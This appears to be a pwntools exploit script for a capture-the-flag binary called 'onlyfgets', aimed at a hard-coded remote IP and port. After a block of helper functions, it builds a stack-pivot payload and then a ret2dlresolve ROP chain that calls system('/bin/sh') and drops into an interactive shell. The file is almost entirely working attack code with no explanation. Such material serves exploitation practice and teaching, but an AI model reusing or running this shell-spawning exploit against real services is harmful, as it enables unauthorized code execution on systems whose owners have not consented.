from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
target = 'tcp 60.205.163.215 14836'

file_name = './onlyfgets'
libc_name = './libc.so.6'

elf = ELF(file_name)
context.binary = elf
libc = ELF(libc_name)

gdb_   = 1 if ('gdb' in sys.argv)        else 0
switch = 1 if ('remote' in sys.argv)     else 0
debug  = 0 if ('deoff'  in sys.argv)     else 1
error  = 1 if ('error'  in sys.argv)     else 0

if debug:
    context(log_level='debug')

if error:
    context(log_level='error')

bps = [
# 0x1234,
# 'main',
# (0xe3b31, 'libc'), 
# ('system', 'libc')
]

gdb_cmd = ''
if gdb_ and switch == 0:
    gdb_cmd += "set breakpoint pending on\n"
    for b in bps:
       if isinstance(b, int):
           gdb_cmd += f"b *$rebase({hex(b)})\n"
       elif isinstance(b, str):
           gdb_cmd += f"b {b}\n"
       elif isinstance(b, tuple) and len(b) == 2 and b[1] == 'libc':
           if 'libc' in locals() and libc:
                target = libc.sym[b[0]] if isinstance(b[0], str) else b[0]
                gdb_cmd += f'b *($base("libc") + {hex(target)})\n'
           else:
                log.warning("未加载 Libc,跳过 Libc 断点")
    gdb_cmd += "c\n"

if switch:
   parts = target.replace(':', ' ').split()
   host = parts[-2]
   port   = int(parts[-1])
   p = remote(host, port)
elif gdb_:
   p = gdb.debug(file_name, gdbscript=gdb_cmd, aslr=True)
else:
   p = process(file_name)

def s(data):             return p.send(data)
def sa(delim, data):     return p.sendafter(delim, data)
def sl(data):            return p.sendline(data)
def sla(delim, data):    return p.sendlineafter(delim, data)
def r(numb=4096):        return p.recv(numb)
def ru(delim, drop=True):return p.recvuntil(delim, drop)
def rl():                return p.recvline()
def ra(t=None):          return p.recvall(timeout=t)
def cl():                return p.close()
def it():                return p.interactive()
def uc64(data):          return u64(data.rjust(8, b'\x00'))
def uu64(data):          return u64(data.ljust(8, b'\x00'))
def a(f, off=libc):      return lg(hex(off), (ret := f.address + off)) or ret
def cb(data):            return data if isinstance(data, bytes) else str(data).encode()
def lg(name, data):      return log.success(name + ': ' + (hex(data) if isinstance(data, int) else data.decode(errors='ignore') if isinstance(data, bytes) else str(data)))
def menu(idx, pmt=b'>'): return sla(pmt, str(idx).encode())
def ga(delim=b'|', name='Leak'):      return [lg(f'{name}[{i}]', x) or x for i, x in enumerate([int(a, 16) for a in re.findall(b'0x[0-9a-fA-F]+', ru(delim))])]
def base(val, binary=elf):            return binary.address + val  
def ntlb(leak, offset, name='Libc'):  return setattr(libc, 'address', leak - (libc.sym[offset] if isinstance(offset, str) else offset)) or lg(name, libc.address)
def ntpie(leak, offset, name='PIE'):  return setattr(elf, 'address', leak - (elf.sym[offset] if isinstance(offset, str) else offset)) or lg(name, elf.address)
def fill(num, content=b'A'):          return (content.encode() if isinstance(content, str) else content) * num
def se(s, f=None):                    return lg(s if isinstance(s, str) else f"bytes: {s.hex()}", (addr := next((f or libc).search(s if isinstance(s, bytes) else s.encode())))) or addr

_rop_cache = {}
def gg(s, f=None):
   target = f or libc
   if target not in _rop_cache:
       _rop_cache[target] = ROP(target)
   rop = _rop_cache[target]
   instrs = [x.strip() for x in s.split(';')]
   gadget = rop.find_gadget(instrs)
   if gadget:
       addr = gadget.address
       lg(s, addr)
       return addr
   else:
       raise ValueError(f"[-] Critical: Gadget not found: {s}")

#################################################################################
main = 0x4011dd
fake_rbp = elf.bss() + 0xe00
dlresolve_data_addr = fake_rbp  + 0x100
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol="system",
    args=["/bin/sh"],
    data_addr=dlresolve_data_addr
)
rop = ROP(elf)
rop.ret2dlresolve(dlresolve)
payload2 = flat([
    fill(40),           
    rop.chain(),        
    b'\x00' * (dlresolve_data_addr - (fake_rbp + 8 + len(rop.chain()))),
    dlresolve.payload    
])
payload1 = flat([
    fill(32),
    fake_rbp, 
    main      
])
sl(payload1)
sleep(0.1) 
sl(payload2)
it()
